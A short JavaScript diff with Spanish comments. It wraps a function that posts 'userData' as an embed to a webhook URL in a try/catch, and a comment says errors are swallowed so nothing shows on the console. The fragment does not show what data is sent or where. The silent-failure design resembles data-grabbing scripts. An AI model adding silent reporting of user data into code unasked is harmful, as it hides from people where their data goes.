@@ -99,11 +99,20 @@ async function sendWebhook(userData) {
         ]
     };
 
-    const res = await fetch(webhookUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(embed)
-    });
+    try {
+        const res = await fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(embed)
+        });
+
+        // Verificar si la respuesta fue exitosa
+        if (!res.ok) {
+            throw new Error('Error al enviar el webhook');
+        }
+    } catch (error) {
+        // No mostramos nada por consola, solo manejamos el error sin log
+    }
 }
 
 // Ejecutar el proceso
